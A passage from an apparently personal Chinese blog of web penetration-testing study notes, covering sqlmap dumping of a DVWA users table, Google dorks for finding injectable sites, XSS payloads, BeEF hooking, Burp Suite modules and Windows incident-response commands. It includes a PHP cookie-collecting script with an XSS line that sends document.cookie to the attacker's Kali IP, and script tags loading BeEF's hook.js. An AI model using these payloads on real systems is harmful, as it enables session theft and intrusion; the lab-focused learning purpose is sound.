--dump</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--batch			//自动化完成</span><br><span class="line"></span><br><span class="line">--sql-shell		//交互模式</span><br><span class="line"></span><br><span class="line">步骤:</span><br><span class="line">1.获取当前数据库</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h6 id="POST参数注册"><a href="#POST参数注册" class="headerlink" title="POST参数注册"></a>POST参数注册</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://....&quot; --batch --cookie=&quot;PHPSESSID=mppj5uv80v7buj1eq4ra996lk6;security=low&quot; --dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://....&quot; --batch --cookie=&quot;PHPSESSID=mppj5uv80v7buj1eq4ra996lk6;security=low&quot; -D dvwa --tables</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://....&quot; --batch --cookie=&quot;PHPSESSID=mppj5uv80v7buj1eq4ra996lk6;security=low&quot; -D dvwa -T users --columns</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://....&quot; --batch --cookie=&quot;PHPSESSID=mppj5uv80v7buj1eq4ra996lk6;security=low&quot; -D dvwa -T users -C &quot;user,password&quot; --dump </span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://....&quot; --batch --cookie=&quot;PHPSESSID=mppj5uv80v7buj1eq4ra996lk6;security=low&quot; --sql-shell</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>综合：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>通过Google搜索可能存在注入的页面</span><br><span class="line">	inurl:.php?id=</span><br><span class="line">	inurl:.jsp?id=</span><br><span class="line">	inurl:.asp?id=</span><br><span class="line">	inurl:./admin/login.php</span><br><span class="line">	inurl:.php?id = intitle:美女</span><br><span class="line">	</span><br><span class="line"><span class="number">2.</span>通过百度搜索可能存在注入的页面</span><br><span class="line">	inurl:news.asp?in = site:edu.cn</span><br><span class="line">	inurl:news.php?in = site:edu.cn</span><br><span class="line">	inurl:news.aspx?in = site:edu.cn</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">跨站脚本(cross site script)，XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。</span><br><span class="line">XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行响应的嵌入代码。</span><br><span class="line">从而盗取用户资料哦、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">XSS攻击的危害包括：</span><br><span class="line"><span class="number">1</span>.盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号</span><br><span class="line"><span class="number">2</span>.控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</span><br><span class="line"><span class="number">3</span>.盗窃企业重要的具有商业价值的资料</span><br><span class="line"><span class="number">4</span>.非法转账</span><br><span class="line"><span class="number">5</span>.强制发送电子邮件</span><br><span class="line"><span class="number">6</span>.网站挂马</span><br><span class="line"><span class="number">7</span>.控制受害者机器向其它网站发起攻击</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/hw/image-20210315134246777.png" alt="image-20210315134246777"></p>
+<p><img src="/images/hw/image-20210315135307860.png" alt="image-20210315135307860"></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">XSS:</span><br><span class="line">放射性XSS:(Reflected XSS)，又称为非持久性跨站脚本攻击，它是最常见的类型XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的连接(即每次攻击都需要用户的点击)。</span><br><span class="line"></span><br><span class="line">存储型XSS(Stored XSS)，又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大，因为每当用户打开页面，查看内容时脚本将自动执行。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常见的JavaScript方法</span><br><span class="line"></span><br><span class="line">alert		alert()	方法用于显示带有一条指定消息和一个确认 按钮的警告框</span><br><span class="line"><span class="built_in">window</span>.location		<span class="built_in">window</span>.location对象用于获取当前页面的地址(URL),并把浏览器重定向到新的页面。</span><br><span class="line">onload		一张页面或一幅图像完成加载</span><br><span class="line">onsubmit		确认按钮被点击</span><br><span class="line">onerror		在加载文档或者图像时发生错误</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h4 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">弹框警告</span><br><span class="line">此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号<span class="string">',一旦脚本能执行，也就意味着后端服务器没有对特殊字符做过滤&lt;&gt;/'</span>	这样就可以证明，这个页面位置存在了XSS漏洞。</span><br><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert(document.cookie)&lt;/</span>script&gt;</span><br><span class="line"></span><br><span class="line">页面嵌套</span><br><span class="line">&lt;iframe src=<span class="string">"http://www.baidu.com"</span> width=<span class="number">300</span> height=<span class="number">300</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">页面重定向</span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.location=<span class="string">"http://www.baidu.com"</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;location.href="http:/</span><span class="regexp">/www.baidu.com"&lt;/</span>script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">弹框警告并重定向</span><br><span class="line">&lt;script&gt;alert(<span class="string">"请移步到我们的新站"</span>);location.href=<span class="string">"http://www.baidu.com"</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;alert('xss');location.href="http:/</span><span class="regexp">/10.1.64.35/mu</span>ltillidae/robots.txt<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">这里结合了一些社工的思想，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外一个站点重新登录账户(克隆网站收集账户)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">访问恶意代码</span></span><br><span class="line"><span class="string">&lt;script src="</span>http:<span class="comment">//www.xxx.com/xss.js"&gt;&lt;/script&gt;</span></span><br><span class="line">&lt;script src="http://BeEF_IP:3000/hook.js"&gt;&lt;/script&gt;		#结合BeEF收集用户的cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">巧用图片标签</span><br><span class="line">&lt;img src=<span class="string">"#"</span> onerror=alert(<span class="string">'xss'</span>)&gt;</span><br><span class="line">&lt;img src=<span class="string">"http://BeEF_IP:3000/hook.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用大小写、字符编码绕开过滤</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/hw/image-20210315143455416.png" alt="image-20210315143455416"></p>
+<h4 id="手工存储XSS"><a href="#手工存储XSS" class="headerlink" title="手工存储XSS"></a>手工存储XSS</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">获取cookie:渗透机 Kali Linux端操作</span><br><span class="line"><span class="number">1.</span>构建收集cookie服务器</span><br><span class="line"><span class="number">2.</span>构造XSS代码并植入到Web服务器</span><br><span class="line"><span class="number">3.</span>等待肉鸡触发XSS并将cookie发送到Kali</span><br><span class="line"><span class="number">4.</span>Cookie利用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim /<span class="keyword">var</span>/www/html/cookie_rec.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cookie = $_GET[<span class="string">'cookie'</span>];</span><br><span class="line">	$log = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">	fwrite($log,$cookie . <span class="string">"\n"</span>);</span><br><span class="line">	fclose($log);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R www-data.www-data /var/www</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过渗透机植入XSS代码:</span><br><span class="line">&lt;script&gt;<span class="built_in">window</span>.open(<span class="string">'http://192.168.53.78/cookie_rec.php?cookie='</span>+<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">注:193.168.53.78为kali的ip</span></span><br><span class="line"><span class="regexp">注:先清楚之前植入的XSS代码</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="自动化XSS"><a href="#自动化XSS" class="headerlink" title="自动化XSS"></a>自动化XSS</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Browser Exploitation Framework(BeEF)</span><br><span class="line">BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透；</span><br><span class="line">BeEF是基于Ruby语言写的，并且支持图形化界面，操作简单；</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">启动beef</span><br><span class="line">beef-xss</span><br><span class="line">账号beef</span><br><span class="line">密码：admin@123</span><br><span class="line"></span><br><span class="line">netstat -ntpl   查看开了哪些端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/hw/image-20210315153902945.png" alt="image-20210315153902945"></p>
+<p>我们可以看到此端口，不限主机访问（可以从任何地方访问），没有限制本机访问</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">命令颜色：</span><br><span class="line"></span><br><span class="line">绿色：	对目标主机生效且不可见(不会被发现)</span><br><span class="line">橙色：对目标主机生效但可能可见(可能被发现)</span><br><span class="line">灰色：对目标主机未必生效(可验证下)</span><br><span class="line">红色：对目标主机不生效</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="Web信息搜集之搜索引擎"><a href="#Web信息搜集之搜索引擎" class="headerlink" title="Web信息搜集之搜索引擎"></a>Web信息搜集之搜索引擎</h3><h4 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h4><h5 id="site"><a href="#site" class="headerlink" title="site"></a>site</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">site:zhihu,com		搜索跟zhihu.com相关的网页</span><br><span class="line">"web安全" site:zhihu.com		搜索跟zhihu.com跟web安全相关的网页</span><br><span class="line">"sql注入" site:zhihu.com		搜索跟zhihu.com跟sql注入相关的网页</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">功能：搜索指定文件类型</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">filetype:pdf "web安全"搜索跟安全书籍相关的pdf文件</span><br><span class="line">filetype:pdf siteLwww.51cto.com	搜索51cto的pdf文件</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h5 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">功能：搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">inurl:.php?id=		搜索网址中有"php?id"的网页</span><br><span class="line">inurl:.jsp?id=		搜索网址中有"jsp?id"的网页</span><br><span class="line">inurl:/admin/login.php		搜索网址中有"/admin/login.php"的网页</span><br><span class="line">inurl:login			搜索网址中有"login"等登录网页</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">功能：搜索标题存在特定关键字的网页</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">intitle:后台管理		搜索网页标题是"后台登录"的相关网页</span><br><span class="line">intitle:后台管理 filetype:php		搜索网页标题是"后台管理"的php页面</span><br><span class="line">intitle:index of “keyword"		搜索此关键字相关的索引目录信息</span><br><span class="line">intitle:index of "parent directory"			搜索根目录相关的索引目录信息</span><br><span class="line">intitle:index of "login"		搜索登录页面信息</span><br><span class="line">intitle:index of "admin"		搜索后台管理页面信息</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">功能:搜索正文存在特定关键字的网页</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">intext:powered by Discuz		搜索Discuz论坛相关的页面</span><br><span class="line">intext:powered by wordpress		搜索wordpress制作的博客网址</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/images/hw/image-20210315195114477.png" alt="image-20210315195114477"></p>
+<h3 id="Web漏扫之Brup-Suite"><a href="#Web漏扫之Brup-Suite" class="headerlink" title="Web漏扫之Brup Suite"></a>Web漏扫之Brup Suite</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Traget : 目标模块用于设置扫描域(target scope)、生成站点地图(sitemap)、生成安全分析</span><br><span class="line"></span><br><span class="line">Proxy : 代理模块用于拦截浏览器的http会话内容</span><br><span class="line"></span><br><span class="line">Spider : 爬虫模块用于自动爬取网站的每个页面内容，并生成完整的网站地图</span><br><span class="line"></span><br><span class="line">Scanner : 扫描模块用于自动化检测漏洞,分为主动和被动扫描</span><br><span class="line"></span><br><span class="line">Intruder : 入侵(渗透)模块根据上面检测到的可能存在漏洞的链接，调用攻击载荷，对目标链接进行攻击。入侵模块的原理是根据访问链接中存在的参数/变量，调用本地字典、攻击载荷，对参数进行渗透测试</span><br><span class="line"></span><br><span class="line">Repeater : 重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line"></span><br><span class="line">Sequencer : 序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line"></span><br><span class="line">Comparer : 对比模块用于比较两次不同的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line"></span><br><span class="line">extender : 通过拓展模块，可以加载自己开发的、或者第三方模块，打造自己的burpsuite功能。通过burpsuite接口，目前可以支持Java、Python、Ruby三种语言的模块编写</span><br><span class="line"></span><br><span class="line">Options : 分为Project/User Options,主要对软件进行全局设置</span><br><span class="line"></span><br><span class="line">Alerts : 显示软件的使用日志信息</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="爬虫功能-Spider"><a href="#爬虫功能-Spider" class="headerlink" title="爬虫功能(Spider)"></a>爬虫功能(Spider)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">准备工作：</span><br><span class="line">设置代理获取域名</span><br><span class="line">访问目标网站</span><br><span class="line">设置目标域</span><br><span class="line">拦截功能关闭</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><h4 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h4><h5 id="开机启动文件"><a href="#开机启动文件" class="headerlink" title="开机启动文件"></a>开机启动文件</h5><p>分析排查是指对Windows系统中的文件、进程、系统信息、日志记录等进行检测，挖掘Window系统中是否具有异常情况。</p>
+<p>命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msconfig	:	查看开机启动项</span><br><span class="line">regedit		:	注册表编辑器</span><br><span class="line"></span><br><span class="line">msinfo32	:	系统信息</span><br><span class="line">net user	:	查看当前系统用户</span><br><span class="line"></span><br><span class="line">eventvwr.msc	:	「事件查看器」</span><br><span class="line"></span><br><span class="line">命令行中输入：</span><br><span class="line">netstat -ano		查看所有开放端口</span><br><span class="line">netstat -ano	|	findstr	"aaa"	</span><br><span class="line">netsh advfirewall firewall			查看防火墙出入站规则</span><br><span class="line">tasklist	|	find	"端口号"</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/images/hw/image-20210318191356152.png" alt="image-20210318191356152"></p>
+<h5 id="temp临时文件"><a href="#temp临时文件" class="headerlink" title="temp临时文件"></a>temp临时文件</h5><p>命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">temp%	:	打开临时文件</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/hw/image-20210318191855682.png" alt="image-20210318191855682"></p>
+<h5 id="浏览器信息记录"><a href="#浏览器信息记录" class="headerlink" title="浏览器信息记录"></a>浏览器信息记录</h5><p><img src="/images/hw/image-20210318193115445.png" alt="image-20210318193115445"></p>
+<p><img src="/images/hw/image-20210318194032601.png" alt="image-20210318194032601"></p>
+<p><img src="/images/hw/image-20210318194130005.png" alt="image-20210318194130005"></p>
+<p><img src="/images/hw/image-20210318194157307.png" alt="image-20210318194157307"></p>
+<p><img src="/images/hw/image-20210318204436293.png" alt="image-20210318204436293"></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://xhh460.github.io">小灰灰</a></p><p> <span>Link:  </span><a href="http://xhh460.github.io/2021/03/07/hw/">http://xhh460.github.io/2021/03/07/hw/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2021/05/07/%E7%AE%97%E6%B3%95%E7%AF%87/" title="算法篇"><span>< PreviousPost</span><br><span class="prevTitle">算法篇</span></a><a class="nextSlogan" href="/2021/01/31/SpringMVC/" title="SpringMVC"><span>NextPost ></span><br><span class="nextTitle">SpringMVC</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo" target="_blank" rel="noopener"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?" + 'true';
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();</script></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HW"><span class="toc-number">2.</span> <span class="toc-text">HW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell"><span class="toc-number">3.</span> <span class="toc-text">WebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含"><span class="toc-number">4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#低安全级别渗透"><span class="toc-number">4.1.</span> <span class="toc-text">低安全级别渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#本地文件包含-webshell"><span class="toc-number">4.1.1.</span> <span class="toc-text">本地文件包含+webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#远程文件包含-webshell"><span class="toc-number">4.1.2.</span> <span class="toc-text">远程文件包含+webshell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#中安全级别渗透"><span class="toc-number">4.2.</span> <span class="toc-text">中安全级别渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#本地文件包含-webshell-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">本地文件包含+webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#远程文件包含-webshell-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">远程文件包含+webshell</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#高安全级别渗透"><span class="toc-number">4.3.</span> <span class="toc-text">高安全级别渗透</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入攻击及防御"><span class="toc-number">5.</span> <span class="toc-text">SQL注入攻击及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查看表记录"><span class="toc-number">5.1.</span> <span class="toc-text">查看表记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">5.2.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL注入实战"><span class="toc-number">5.3.</span> <span class="toc-text">SQL注入实战</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#基于错误的注入"><span class="toc-number">5.3.1.</span> <span class="toc-text">基于错误的注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#基于布尔的注入"><span class="toc-number">5.3.2.</span> <span class="toc-text">基于布尔的注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#基于UNION注入"><span class="toc-number">5.3.3.</span> <span class="toc-text">基于UNION注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#基于时间的盲注"><span class="toc-number">5.3.4.</span> <span class="toc-text">基于时间的盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sqlmap自动化注入"><span class="toc-number">5.3.5.</span> <span class="toc-text">sqlmap自动化注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#POST参数注册"><span class="toc-number">5.3.5.1.</span> <span class="toc-text">POST参数注册</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS"><span class="toc-number">6.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#构造XSS脚本"><span class="toc-number">6.1.</span> <span class="toc-text">构造XSS脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#手工存储XSS"><span class="toc-number">6.2.</span> <span class="toc-text">手工存储XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#自动化XSS"><span class="toc-number">6.3.</span> <span class="toc-text">自动化XSS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web信息搜集之搜索引擎"><span class="toc-number">7.</span> <span class="toc-text">Web信息搜集之搜索引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Google-Hacking"><span class="toc-number">7.1.</span> <span class="toc-text">Google Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#site"><span class="toc-number">7.1.1.</span> <span class="toc-text">site</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#filetype"><span class="toc-number">7.1.2.</span> <span class="toc-text">filetype</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#inurl"><span class="toc-number">7.1.3.</span> <span class="toc-text">inurl</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#intitle"><span class="toc-number">7.1.4.</span> <span class="toc-text">intitle</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#intext"><span class="toc-number">7.1.5.</span> <span class="toc-text">intext</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web漏扫之Brup-Suite"><span class="toc-number">8.</span> <span class="toc-text">Web漏扫之Brup Suite</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#爬虫功能-Spider"><span class="toc-number">8.1.</span> <span class="toc-text">爬虫功能(Spider)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#应急响应"><span class="toc-number">9.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows分析排查"><span class="toc-number">9.1.</span> <span class="toc-text">Windows分析排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 